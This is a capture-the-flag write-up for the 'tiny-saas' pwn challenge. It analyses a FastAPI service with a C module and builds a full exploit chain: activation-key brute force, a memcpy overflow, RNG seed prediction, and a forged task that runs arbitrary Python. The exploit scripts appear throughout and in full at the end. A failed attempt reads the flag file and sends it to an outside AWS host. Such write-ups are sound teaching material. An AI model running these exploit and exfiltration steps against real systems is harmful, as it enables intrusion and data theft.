# tiny-saas

[library.m0unt41n.ch/challenges/tiny-saas](https://library.m0unt41n.ch/challenges/tiny-saas) ![](../../resources/pwn.svg) ![](../../resources/medium.svg) 

# TL;DR

*   We get a dynamic HTML page, with all logic implemented as JS talking to a
    remote server.
*   The functionality is roughly: running simple computational tasks, either synchronously
    or asynchronously. The latter requires *"activating the licence"* for which we don't
    have the code.
*   The server uses [FastAPI](https://fastapi.tiangolo.com/), but mostly for wrapping the
    logic which is actually written as a custom C module.
*   We can get the source code by downloading a Docker image from repository

## Outline of the solution

*   `activateLicence()` incorrectly compares only first `len(input)` characters, which
    allows brute-forcing the activation code one character at a time.
*   `/__debug__/` API endpoint allows creating arbitrary objects in memory, by sending
    Base64-encoded requests. It also returns their `id` - i.e. address in RAM.
*   `activateLicence()` does not verify `input_buffer.len` for `memcpy()`.
    *   Its Python counterpart (`activate_api()`) does, but it allows up to 16 characters.
    *   Looking at the `struct server_state`, this means that we can overwrite the
        first pointer in the `task *tasks[MAX_TASKS]`
    *   Combined with ability to create memory objects (`/__debug__/`), this means that,
        once we "activate" the async request functionality, we can create a custom `task`
        in RAM, get its address and write it to `tasks[0]` - which will be then eventually
        picked by one of the async threads.
*   In `struct task` we can provide an address of a C function, and, looking at
    `thread_run()`, we control up to two arguments for it.
*   One complexity: items in `struct task` are checksummed with CRC-32, using
    polynomial that is randomly generated.
    *   We *do* get a leak for it (`/poly/` endpoint), but it returns *address* of
        the respective Python object, not the value.
    *   But the RNG is initialized and used in a predictable way, plus we can get
        some initial values (result IDs).
    *   A simple heuristics can provide the real value of the CRC-32 polynomial.
*   All this combined enables calling `PyRun_SimpleString`, with arbitrary Python
    code as a string argument (that we can also inject using `/__debug__/` endpoint).
*   In that string we can do... stuff &#128522; I ended up just in-memory patching the
    YT URL returned by `/contact/` endpoint:
    *   Getting writable RAM segments from `/proc/self/maps`
    *   Mapping them with `ctypes.string_at()`
    *   Finding and replacing any occurences of the YT URL with the flag

---

# Prepare the package

We don't get a package to download, but a pointer to
[ghcr.io/departement-of-sales/tinysaas](http://ghcr.io/departement-of-sales/tinysaas).


## Analyze the layers

```bash
$ docker pull ghcr.io/departement-of-sales/tinysaas
$ docker save ghcr.io/departement-of-sales/tinysaas | tar xvf - blobs
$ for F in blobs/sha256/*; do echo $F ; tar tvf $F ; done
```

The layer with the app seems to be:

```
blobs/sha256/a0ad9f1c4f988c4cdc4c7365e6ab2c550f00bc8a2ce80a8c267554157c5b810b
drwxr-xr-x 0/0               0 2024-07-07 02:26 app/
-rwxrwxrwx 0/0             417 2024-07-07 00:48 app/Dockerfile
-rwxrwxrwx 0/0            2606 2024-06-29 01:22 app/api.py
-rwxrwxrwx 0/0              18 2024-06-29 02:13 app/flag.txt
drwxrwxrwx 0/0               0 2024-07-07 01:06 app/library/
-rwxrwxrwx 0/0             153 2024-06-29 00:49 app/library/Makefile
-rwxrwxrwx 0/0           10318 2024-07-07 02:21 app/library/custom.c
-rwxrwxrwx 0/0              29 2024-05-25 23:00 app/library/setup.cfg
-rwxrwxrwx 0/0             366 2024-05-25 23:12 app/library/setup.py
drwxrwxrwx 0/0               0 2024-07-07 01:06 app/static/
-rwxrwxrwx 0/0           23982 1985-10-26 09:15 app/static/98.css
-rwxrwxrwx 0/0            8540 2024-06-03 02:05 app/static/ms_sans_serif.woff
-rwxrwxrwx 0/0            6508 2024-06-03 02:05 app/static/ms_sans_serif.woff2
-rwxrwxrwx 0/0            8304 2024-06-03 02:05 app/static/ms_sans_serif_bold.woff
-rwxrwxrwx 0/0            6264 2024-06-03 02:06 app/static/ms_sans_serif_bold.woff2
-rwxrwxrwx 0/0            4254 2024-06-29 00:09 app/static/static.js
-rwxrwxrwx 0/0              39 2024-06-03 02:02 app/static/styles.css
drwxrwxrwx 0/0               0 2024-07-07 01:06 app/templates/
-rwxrwxrwx 0/0            6159 2024-06-28 01:24 app/templates/index.html
```

## Extract the app and fix some minor bugs

```bash
$ tar xvf blobs/sha256/a0ad9f1c4f988c4cdc4c7365e6ab2c550f00bc8a2ce80a8c267554157c5b810b
$ rm -rf blobs
$ docker rmi ghcr.io/departement-of-sales/tinysaas
```

### Permissions

For some reason all files are `777`, which looks annoying

```bash
$ find app \( -type d ! -perm 755 -ls -exec chmod 755 {} \; \) -o \( -type f ! -perm 644 -ls -exec chmod 644 {} \; \)
```

### FastAPI installation

As-downloaded, `docker run` fails with:

```
RuntimeError: To use the fastapi command, please install "fastapi[standard]"`)
```

So, we do just that

```Dockerfile
RUN pip install "fastapi[standard]" --break-system-packages
```

### Buffering

Default FastAPI configuration has buffered stdio, which means that we don't get
debugging messages in realtime. The fix:

```Dockerfile
ENV PYTHONUNBUFFERED=1
```

## Add pwndbg to Dockerfile

(my standard snippet)

```Dockerfile
##########################################################################################
RUN apt-get install -y git vim gdb python3-dev python3-pwntools python3-poetry python3-dbg
RUN git clone https://github.com/pwndbg/pwndbg  ~/pwndbg && cd ~/pwndbg && ./setup.sh
RUN echo "set startup-quietly on" >~/.gdbearlyinit
RUN echo "source ~/pwndbg/gdbinit.py\n\
set show-tips off\n\
set max-visualize-chunk-size 192\n\
set debuginfod enabled off\n\
set breakpoint pending on\n" >~/.gdbinit
RUN echo "export LC_CTYPE=C.UTF-8" >>~/.bashrc
RUN echo "export PWNDBG_NO_AUTOUPDATE=1" >>~/.bashrc
##########################################################################################
```

## Rebuild the image and start the app:

```bash
$ cd app
$ docker build -t app:latest .
$ docker run -p 8080:8080 app:latest
$ docker container exec -it $(docker ps -q) /bin/bash
```

At this point, going to [localhost:8080](http://localhost:8080) gets us the UI.

# Analysis

## HTML / JS

Not much to see here. A static `index.html`, made live by `static.js`, that has
a bunch of code parsing the forms and talking to the API server.

## api.py

FastAPI-based server, implementing few methods, passing arguments with JSON
payload:

*   `GET /`: returns `index.html` with no context
*   `POST /run/`:
    *   Takes four parameters: `is_async`, `method`, `argc` and `argv`.
    *   Allowed methods are `isprime` and `simulate`, both with one argument and
        trivial functionality (return 0/1 for the argument or wait N seconds)
    *   Depending on `is_async` calls these methods via either `run_sync()` or
        `run_async()`, both implemented in the C module below
    *   In either case returns an integer "result ID"
*   `GET /get/`: retrieves the result with a given ID (returns error if result is
     not (yet) available)
*   `POST /__debug__/`: creates an object and returns its internal information as
    a dict, via `debug()` method implemented in C. The object can be either a string
    or, if the string is Base64-encoded, it gets decoded into `bytes`.
*   `GET /activated/`: checks "activation" status (pass-through to C function)
*   `GET /contact/`: redirects to a rick-roll YT video
*   `POST /activate/`: "activates" async requests using a base64-encoded key provided
    as a param. The decoded key has to have between 1 and 16 characters (bytes).
*   `POST /poly/`: returns internal `state.POLYNOMIAL` variable from the C module.
    Or, more specifically, the *memory address* of a `PyLong` object with that
    value - this difference will be important later.

Overall, not much actual functionality there, most of it is in the C module.

## library/custom.c

Keeps all the important server state and handles the logic.

### Server state

```c
typedef struct server_state {
    char activation_key[8];
    task *tasks[MAX_TASKS];
    result *results[MAX_RESULTS];
    char *error;
    int stop_thread;
    int isActivated;
    PyObject* POLYNOMIAL;
} server_state;
server_state state;
```

Where `task` is:

```c
typedef struct task {
    long id;
    size_t arg_count;
    void **args;
    void *(*method)(size_t, void**);
    void (*callback)(void*, long);
    unsigned long checksum;
} task;
```

And `result` is:

```c
typedef struct result {
    long id;
    void *result;
} result;
```

### Task implementation

The functions that implement actual tasks to be executed:

*   `long isPrime(long num)` and its Python version `void *isPrimeWrapper(size_t arg_count, PyObject *args)`
*   `long sleep_ms(size_t wait_ms)` and its Python version `void *simulateHeavyProcessing(size_t arg_count, PyObject *args)`

Both are self-explanatory.

### CRC-32 checksumming

*   `unsigned long crc32(const unsigned char *data, size_t length)` calculates a
    CRC-32 checksum of a given memory area, using `state.POLYNOMIAL` that is initialized
    to NULL and **randomly generated at its first use**. RNG is seeded in `init_threads()`,
    using the epoch.
*   The `unsigned long calculate_checksum(task *t)` calculates that checksum for a
    `task` structure (all but last field).
*   The `PyObject *poly(PyObject *self, PyObject *args)` (exported with `/poly/` endpoint
    above) can leak the polynomial - but, the way it is implemented means that it
    returns the object *address*, not the *value*:

    ```c
    PyObject *poly(PyObject *self, PyObject *args) {
        return PyLong_FromSize_t((size_t)state.POLYNOMIAL);     // Little gift
    }
    ```

### debug()

Creates a copy of provided object and returns a `dict` with its critical internal
data: `__id__`, `__hash__`, `__repr__` and `__dir__`. Combined with respective API
endpoint, enables injecting arbitrary bytes into RAM.

### Managing the activation

Activation state is stored in `state.isActivated` and `state.activation_key`.

```c
int verifyActivation() {
    long key_length = strlen(&state.activation_key);
    char *key = getenv("ACTIVATION_KEY");
    return key!=NULL && state.activation_key!=NULL && !strncmp(key, &state.activation_key, key_length);
}
```

This has a critical bug: `state.activation_key` is the **input** provided by user -
and the `strncmp()` compares only up to length of that input. There is no limit on
activation attempts - which means that we can:

*   Enable activation by just iterating over single-character codes.
*   Retrieve the full activation code, by sequentially brute-forcing characters.

```c
PyObject *activateLicence(PyObject *self, PyObject *args) {
    Py_buffer input_buffer;
    if (!PyArg_ParseTuple(args, "s*", &input_buffer)) {
        PyErr_SetString(PyExc_Exception, "Failed to parse arguments.");
        return NULL;
    }
    memcpy(&state.activation_key, input_buffer.buf, input_buffer.len);
    state.activation_key[input_buffer.len] = '\0';
    if(!verifyActivation()) {
        PyErr_SetString(PyExc_Exception, "Activation key is wrong. Please contact our office here <a href=\"/contact/\">contact</a>.");
        return NULL;
    }
    state.isActivated = 1;
    return Py_NewRef(Py_None);
}
```

This has two further bugs:

*   First activation is permanent. Providing a bad code does not reset
    `state.isActivated` to 0.
*   Critical: `memcpy()` copies up to `input_buffer.len` which, from the Python
    part above, can be up to 16 bytes.
    **This means that we can overwrite first 8 bytes of `tasks[]` array** (i.e.
    pointer to the first task) by sending extra bytes after the activation code.

Finally, the `/activated/` method uses a simple:

```c
PyObject *is_activated(PyObject *self, PyObject *args) {
    return PyBool_FromLong(state.isActivated);
}
```

### Managing tasks

*   **Creating a new task object**

    Note that `callback` is set to `saveResult()` (below) and the checksum is
    calculated using above CRC-32 function.

    ```c
    task *createTask(void *method, size_t arg_count, void **args) {
        task *t = (task *)malloc(sizeof(task));
        t->method = method;
        t->id = rand();
        t->arg_count = arg_count;
        t->args = args;
        t->callback = saveResult;
        t->checksum = calculate_checksum(t);
        return t;
    }
    ```

*   **Adding task to the queue**

    ```c
    int addTask(task *t) {
        if (state.stop_thread) {
            if(!init_threads()) return -1;
        }
        pthread_mutex_lock(&lock);
        for (int i = 0; (i <= MAX_TASKS) && (state.tasks[i] != NULL); i++);
        state.tasks[i] = t;
        pthread_mutex_unlock(&lock);
        return i;
    }
    ```

    This has a subtle bug in that if task queue is full, it will write to
    `tasks[MAX_TASKS]` i.e. `results[0]`.

### Managing results

*   `void saveResult(void *result_obj, long result_id)` finds a free slot
    in `state.results` table and puts a new `struct result` object there.
*   `PyObject *get(PyObject *self, PyObject *args)` returns a given result from
    the list, for the purpose of `/get/` endpoint.

### Executing synchronous tasks

This is pretty much a wrapper which:

*   takes the parameters
*   finds the right method address
*   calls the method
*   creates `result` object with a random `id` and stores it in the list.
*   returns the `id`

## Asynchronous task logic

### Thread loop

Most important part is a pool of 4 threads, initialized at the import time, all of which
continuously grab unclaimed items from the `state.tasks` array. The thread loop function
is:

```c
void* thread_run(void *args) {
    while (!state.stop_thread) {
        sleep(1);
        pthread_mutex_lock(&lock);
        for(int i = MAX_TASKS-1; (i >= -1) && (state.tasks[i] == NULL); i--);
        if (i < 0) {
            pthread_mutex_unlock(&lock);
            continue;
        }
        printf("Found task: %d\n", i);
        task *t = state.tasks[i];
        state.tasks[i] = NULL;
        printf("task: %p\n", t);
        pthread_mutex_unlock(&lock);

        if(calculate_checksum(t) != t->checksum) {
            printf("checksum %ld of task %d is invalide! it should be %ld\n", t->checksum, i, calculate_checksum(t));
            continue;
        }
        PyGILState_STATE gstate;
        gstate = PyGILState_Ensure();
        void *res = t->method(t->arg_count, t->args);
        PyGILState_Release(gstate);
        if(t->callback)
            t->callback(res, t->id);
    }
    return NULL;
}
```

Note how the method is called: we take `t->arg_count` and `t->args`, but
**these can be arbitrary 64-bit integers**, not necessarily meaning these
things. If we control these fields and `t->method`, we can
**execute arbitrary function with up to 2 arguments**.

Some other remarks:

*   Each thread can pick a task only every second.
*   The tasks in the queue have to have correct checksum, otherwise
    they will be just silently removed from the queue.
*   There is a subtle memory leak (task structs are never freed) &#128578;

### Executing async tasks

What feeds the thread loops is `run_async_function` (called from `/run/` endpoint):

```c
PyObject *run_async_function(PyObject *self, PyObject *args) {
    if (!state.isActivated) {
        PyErr_SetString(PyExc_PermissionError, "Please activate the application to unlock this feature");
        return NULL;
    }
    if(state.error) {
        PyErr_SetString(PyExc_Exception, state.error);
        return NULL;
    }
    PyObject *meth_args;
    long meth_id, args_count;
    if (!PyArg_ParseTuple(args, "llO", &meth_id, &args_count, &meth_args)) {
        PyErr_SetString(PyExc_Exception, "Parsing args failed...");
        return NULL; // Parsing failed, return NULL
    }
    Py_INCREF(meth_args);

    void (**methods[])(size_t, PyObject *) = {isPrimeWrapper, simulateHeavyProcessing};
    void *method = methods[meth_id];
    task *t = createTask(method, args_count, (void**)meth_args);
    addTask(t);
    return PyLong_FromLong(t->id);
}
```


# Summary so far

*   Breaking activation is a simple brute-force.
*   We can put arbitrary data in new memory objects (`/__debug__/`) - the address will
    be returned in the `id` element of the dict.
*   Thanks to overflow in the activation code, we can send up to 16 bytes as a
    Base64 string and overwrite `tasks[0]` with the latter 8.
*   So, we can get the thread loop to execute arbitrary function we point to from there.
*   There is no obvious way to get the CRC-32 polynomial. `poly()` function is
    not helpful here.
*   We are not yet sure **what** to call from that hand-crafted `task`.

Let's tackle these one by one.

# Wrapping the useful API methods

```python
URL = "http://localhost:8080"
if len(sys.argv)>1:
    URL = sys.argv[1]

# API /run/ - execute a task. Return task ID - i.e. rand() value
def run(is_async:bool, method:str, arg:str):
    params = {"is_async": is_async, "method": method, "argc": 1, "argv": [arg]}
    r = requests.post(URL+"/run/", json=params)
    return r.json()["id"]

# API /__debug__/ - put bytes in server's RAM. Return the address.
def debug(arg:bytes):
    params = {"obj": "base64:"+base64.b64encode(arg).decode('ascii')}
    r = requests.post(URL+"/__debug__/", json=params)
    return r.json()["__id__"]+0x20

# API /activate/ - Send activation byte string, with possible overflow.
def activate(code:bytes):
    params = {"activation_code": base64.b64encode(code).decode('ascii')}
    requests.post(URL+"/activate/", params=params).json()
```

# Re-implementing CRC-32 in Python

A 1:1 rewrite of the C function, with only difference being that we pass the
polynomial as an argument.

```python
def crc32(data:bytes, poly:int):
    crc_table = [0] * 256
    crc = 0xFFFFFFFF
    for i in range(256):
        remainder = i
        for j in range(8, 0, -1):
            if (remainder & 1) != 0:
                remainder = (remainder >> 1) ^ poly
            else:
                remainder = remainder >> 1
        crc_table[i] = remainder
    for i in range(len(data)):
        byte = data[i]
        lookupIndex = (crc ^ byte) & 0xFF
        crc = (crc >> 8) ^ crc_table[lookupIndex]
    return crc ^ 0xFFFFFFFF
```

# Activation

First, let's get the "activation" out of the way. This is a simple brute-force:

```python
import base64
import requests

CHARSET="abcdefghijklmnopqrstuvwxyz0123456789_ABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&()+,-./:;<=>@[]^`|~"
URL="https://caa68def-d6b3-44fd-befe-ad56f9790f5c.library.m0unt41n.ch:31337"

code=""
for i in range(10):
  for c in CHARSET:
    cc = base64.b64encode((code+c).encode('ascii')).decode('ascii')
    r = requests.post(URL+"/activate/", params={"activation_code": cc}).json()
    if "result" in r:
      code += c
      print(code)
      break
```

This goes up to `QP-fREP4` - and then we get connection closed, likely because the
thread loop interprets `tasks[0]` as an invalid pointer.

Anyway, good. Local container has activation code set to `test` so, we let's differentiate:

```python
URL = "http://localhost:8080"
ACTIVATION_CODE=b"test"
if len(sys.argv)>1:
    URL = sys.argv[1]
    ACTIVATION_CODE=b"QP-fREP4"
```

# Guessing the RNG / getting the CRC-32 polynomial

As outlined above, we can not easily get the polynomial value with `poly()` as that
returns object *address* - and there is no obvious way to turn it into *value*
(`/__debug__/` doesn't seem to help).

However, we know that:

*   RNG is initialized with the epoch: `srand((unsigned) time(&t));`
*   `state.POLYNOMIAL` is initialized with `rand()` at first use of async method.
*   The only other uses of `rand()` are:
    *   `createTask()` to get a task ID
    *   `run_sync_function()` to get a result ID

Idea: don't guess the polynomial, but **guess the epoch** &#128512;
and the first few values of `rand()` - in particular, the one that will be
used to initialize `state.POLYNOMIAL`. More concretely:

*   Start the exploit shortly after the API server starts
*   Run a simple `isprime` sync task. Its result ID will be the
    **second random number** generated by the program. Why second?
    I don't know &#128512;, that's what I observed. There is apparently something
    using it before
*   Use libc's RNG via [ctypes.CDLL](https://docs.python.org/3/library/ctypes.html),
    to mimic what is happening in the remote RNG
*   Iterate from current epoch backwards
    *   `srand()`
    *   `rand()`
    *   `rand()` - for a correct epoch, this will be the same as above task ID.
    *   ... and then, further random numbers will match too.

Then, if we know exactly what requests will be respective values of `rand()` used
in serving them. In particular, the one used to initialize `state.POLYNOMIAL`.

All that expressed in code:

```python
import math
import ctypes

start_time = int(math.floor(time.time()))
rand2_remote = run(False, "isprime", 1)
libc = ctypes.CDLL("libc.so.6")
for offset in range(1000):
    libc.srand(start_time-offset)
    rand1_local = libc.rand()
    rand2_local = libc.rand()
    if rand2_local == rand2_remote:
        rand3_local = libc.rand()
        rand4_local = libc.rand()
        print("rand1: ", rand1_local)
        print("rand2: ", rand2_local)
        print("rand3: ", rand3_local)
        print("rand4: ", rand4_local)
        break
if offset == 999:
    print("FAILED!")
    sys.exit(1)
```

Spoiler alert: our `POLYNOMIAL` will be the `rand4_local`.

# Using all that for RCE

First of all, we can not just send that fake "activation" with extra code right away - we need
at least one "proper" async method to execute, because the polynomial is initialized on
*creation*. What we need instead:

*   Get the activation code and guess the expected `POLYNOMIAL` value (above)
*   `activate()`
*   `run()` a *1 second* `simulate` task
*   Wait a short moment for the threads to pick it. No need to wait for the task to
    *complete*, picking up already frees the slot for task #0.
*   Create a fake task structure, which calls arbitrary function
*   Add the `crc32()`
*   Put that task in RAM on the server using `debug()`
*   `activate()`, with a key consisting of 8 random bytes plus
    base64-encoded address of the task

Now, this could be done in a more thread-safe way &#128578; We could start the tasks
in a sequence which ensures that, by the time we're overwriting `tasks[0]`, all
four tasks are busy. But this works well enough.

## *What* arbitrary function?

One natural candidate I found was
[PyRun_SimpleString](https://docs.python.org/3/c-api/veryhigh.html).
It takes a single argument and it is a regular C string - which we can
easily craft using `debug()` method above.

***Very, very, very conveniently***: that function is in the non-randomized part
of the address space, at a fixed offset of `0x4b5844`:

```
# gdb -p 1
...
(gdb) print PyRun_SimpleString
$1 = {<text variable, no debug info>} 0x4b5844 <PyRun_SimpleString>
```

Note: **It is important to check this with the original container**, executed
straight from `ghcr.io` - *not* the reverse-engineered and updated one above.
These offsets differed for me.

## How do we fill the `task` structure:

Remember how `thread_run()` calls the task method:

```c
void *res = t->method(t->arg_count, t->args);
```

Mapping this to `struct task`:

| Offset | Name      | Payload contents                           |
| ------ | --------- | ------------------------------------------ |
| 0      | id        | (anything)                                 |
| 8      | arg_count | Address of payload Python code string      |
| 16     | args      | (anything)                                 |
| 24     | method    | Address of `PyRun_SimpleString` function   |
| 32     | callback  | 0 (we don't want callback)                 |
| 40     | checksum  | Calculated using `crc32()`                 |

## Code

All this combined:

```python
PY_RUN_SIMPLE_STRING=0x4b5844

python_payload_addr = debug("print('This works!')")

activate(ACTIVATION_CODE)
run(True, "simulate", "1")
time.sleep(0.5)

payload  = pwn.p64(0xCAFEBABECAFEBABE)
payload += pwn.p64(python_payload_addr)
payload += pwn.p64(0)
payload += pwn.p64(PY_RUN_SIMPLE_STRING)
payload += pwn.p64(0)
checksum = crc32(payload, rand4_local)
payload += pwn.p64(checksum)

fake_task_addr = debug(payload)

activate(b'01234567'+pwn.p64(fake_task_addr))
```

And indeed - this works! It got me the message on the console. &#128512;

# *What* Python payload?

With an open RCE it should be normally easy from here. But I actually struggled
a bit to get it right.

## What did not work

*   **Sending the flag to remote server**

    I tried starting a HTTP server on an AWS instance and sending a payload:

    ```python
    import requests
    flag = open("flag.txt", "r").readline()
    requests.get(AMAZON_URL+"/flag="+flag)
    ```

    That worked just fine in my local Docker instance - but not remotely.

*   **Replacing FastAPI with dummy HTTP server**

    Assuming that at least incoming port 8080 is unrestricted (and proxied from
    the SSL tunnel), I thought that following might work:

    ```python
    import http.server
    fd = 11  # Poking at local Docker, that's FastAPI listening socket
    close(fd)
    http.server.test(HandlerClass=http.server.SimpleHTTPRequestHandler, port=8080)
    ```

    That worked just fine in my local Docker instance - but not remotely. I tried
    the same, but actually iterating over sockets (which involved running
    `system("apt-get install -y python3-psutil")` as part of the payload &#128512;) and
    finding the right one. Same result.

*   **exec() a dummy HTTP server**

    Next idea was to replace complete FastAPI server (which would presumably close
    the listening FD and allow reopening the same serving port):

    ```python
    import os
    os.exec("/usr/bin/python3", ["-m", "http.server", "8080"])
    ```

    That did not work.

*   **Actually returning a retrievable string object**<br>

    If we could add `saveResult()` as a callback and `return` a string from the
    Python payload, there is a chance we could then just retrieve it from the API.
    Unfortunately `saveResult` is in the dynamically loaded part and we can not
    (easily) get a pointer to it.

*   **Replacing `api.py` with own code code**

    ... and triggering FastAPI restart. That did not work, I couldn't get the "restart" part &#128578;

*   **Adding a new endpoint that would serve the flag**

    I was thinking about adding something like this in the payload:

    ```python
    @app.get("/get_flag")
    def get_flag():
        flag = open("flag.txt", "r").readline()
        return RedirectResponse("http://dummy.url/flag="+flag)
    ```

    That did not work - the environment/namespace of `PyRun_SimpleString` is different from
    the one where FastAPI methods are defined. I did not dig deep enough to find how to
    get around it.

## What worked: patching strings in RAM

With all the reasonable options off the table, I decided to go the old fashioned way:
in-memory patch some string that we know we can get. The natural candidate was
the YT URL in `/contact/` handler: `https://www.youtube.com/watch?v=dQw4w9WgXcQ.`.
It's got to be there somewhere, right? &#128578;

With a bit of reading about
[ctypes.string_at()](https://docs.python.org/3/library/ctypes.html#ctypes.string_at)
and
[ctypes.memmove()](https://docs.python.org/3/library/ctypes.html#ctypes.memmove),
the Python payload became:

```python
import re
import ctypes

# Read the memory map
with open(f"/proc/self/maps", "r") as maps_file:
    memory_maps = maps_file.readlines()

# Find all the R/W segments
rw_segments = []
for line in memory_maps:
    if "rw" in line.split()[1]:
        match = re.match(r"([0-9a-f]+)-([0-9a-f]+)", line)
        if match:
            start = int(match.group(1), 16)
            end = int(match.group(2), 16)
            rw_segments.append((start, end))

# Read the flag
flag = open("/app/flag.txt", "r").readline()
patch = flag.encode('ascii')

# Replace all the occurences of the YT URL with the flag
for start, end in rw_segments:
    buf = ctypes.string_at(start, end-start)
    # Split in two, to avoid finding itself.
    p1 = b"https://www.youtube.com"
    p2 = b"/watch?v=dQw4w9WgXcQ."
    offset = buf.find(p1+p2)
    if offset != -1:
        ctypes.memmove(start+offset, patch, len(patch))
```

This can be tested in a separate environment - it works.

Then, the flag can be retrieved with a simple

```python
import urllib.parse
time.sleep(1.5)  # Apparently still needs a moment
r = requests.get(URL+"/contact/", allow_redirects=False)
print(urllib.parse.unquote(r.headers['Location']))
```

Note that this implicitly assumes the flag will be shorter than the URL.
Turns out that it is *exactly* as long - and the URL has an extra dot
which makes it so. Coincidence? &#128539;

The flag: `shc2024{did_you_know_python_has_a_heap_O.o?}`

# Complete exploit

*   For simplicity, this skips getting the activation code.
*   If run without argument, will talk to `http://localhost:8080/`, otherwise,
    to the remote SSL tunnel provided as arg.
*   **Remember: this has to be run right after starting the instance**

```python
#!/usr/bin/python3

import base64
import ctypes
import requests
import sys
import time
import urllib.parse

# URL and activation code
URL = "http://localhost:8080"
ACTIVATION_CODE=b"test"
if len(sys.argv)>1:
    URL = sys.argv[1]
    ACTIVATION_CODE=b"QP-fREP4"

# Found with gdb in the container started directly from
# ghcr.io/departement-of-sales/tinysaas:latest
PY_RUN_SIMPLE_STRING=0x4b5844

# In-memory patch the YT address in /contact/ handler to be the flag instead.
PYTHON_PAYLOAD = b"""
import re
import ctypes

# Read the memory map
with open(f"/proc/self/maps", "r") as maps_file:
    memory_maps = maps_file.readlines()

# Find all the R/W segments
rw_segments = []
for line in memory_maps:
    if "rw" in line.split()[1]:
        match = re.match(r"([0-9a-f]+)-([0-9a-f]+)", line)
        if match:
            start = int(match.group(1), 16)
            end = int(match.group(2), 16)
            rw_segments.append((start, end))

# Read the flag
flag = open("/app/flag.txt", "r").readline()
patch = flag.encode('ascii')

# Replace all the occurences of the YT url with the flag
for start, end in rw_segments:
    buf = ctypes.string_at(start, end-start)
    # Split in two, to avoid finding itself.
    p1 = b"https://www.youtube.com"
    p2 = b"/watch?v=dQw4w9WgXcQ."
    offset = buf.find(p1+p2)
    if offset != -1:
        ctypes.memmove(start+offset, patch, len(patch))
"""

# API /run/ - execute a task. Return task ID - i.e. rand() value
def run(is_async:bool, method:str, arg:str):
    params = {"is_async": is_async, "method": method, "argc": 1, "argv": [arg]}
    r = requests.post(URL+"/run/", json=params)
    return r.json()["id"]

# API /__debug__/ - put bytes in server's RAM. Return the address.
def debug(arg:bytes):
    params = {"obj": "base64:"+base64.b64encode(arg).decode('ascii')}
    r = requests.post(URL+"/__debug__/", json=params)
    return r.json()["__id__"]+0x20

# API /activate/ - Send activation byte string, with possible overflow.
def activate(code:bytes):
    params = {"activation_code": base64.b64encode(code).decode('ascii')}
    requests.post(URL+"/activate/", params=params).json()

# Re-implemented crc32() from C module
def crc32(data:bytes, poly:int):
    crc_table = [0] * 256
    crc = 0xFFFFFFFF
    for i in range(256):
        remainder = i
        for j in range(8, 0, -1):
            if (remainder & 1) != 0:
                remainder = (remainder >> 1) ^ poly
            else:
                remainder = remainder >> 1
        crc_table[i] = remainder
    for i in range(len(data)):
        byte = data[i]
        lookupIndex = (crc ^ byte) & 0xFF
        crc = (crc >> 8) ^ crc_table[lookupIndex]
    return crc ^ 0xFFFFFFFF

###########################################################################

# Heuristics to guess the RNG state
start_time = int(time.time())
rand2_remote = run(False, "isprime", 1)
libc = ctypes.CDLL("libc.so.6")
for offset in range(1000):
    libc.srand(start_time-offset)
    rand1_local = libc.rand()
    rand2_local = libc.rand()
    if rand2_local == rand2_remote:
        rand3_local = libc.rand()
        rand4_local = libc.rand()  # This becomes the polynomial
        break
if offset == 999:
    print("RNG heuristics FAILED!")
    sys.exit(1)

# Load Python code on server
python_payload_addr = debug(PYTHON_PAYLOAD)

# Activate async requests
activate(ACTIVATION_CODE)

# Run a quick async task to initialize the CRC-32 polynomial
run(True, "simulate", "1")
time.sleep(0.5)

# Prepare a fake task
payload  = b"\xCA\xFE\xBA\xBE\xCA\xFE\xBA\xBE"
payload += python_payload_addr.to_bytes(8, "little")
payload += b"\x00\x00\x00\x00\x00\x00\x00\x00"
payload += PY_RUN_SIMPLE_STRING.to_bytes(8, "little")
payload += b"\x00\x00\x00\x00\x00\x00\x00\x00"
checksum = crc32(payload, rand4_local)
payload += checksum.to_bytes(8, "little")
fake_task_addr = debug(payload)

# Send the fake task to the queue
activate(b'01234567'+fake_task_addr.to_bytes(8, "little"))
# Give it some time to settle
time.sleep(1.5)

# Grab the "improved" contact URL
r = requests.get(URL+"/contact/", allow_redirects=False)
print(urllib.parse.unquote(r.headers['Location']))
```

---

## shc2024{did_you_know_python_has_a_heap_O.o?}


<hr>

&copy; [muflon77](https://library.m0unt41n.ch/players/805ae1c8-9fe4-5816-b4a4-5057fa6eedb1)
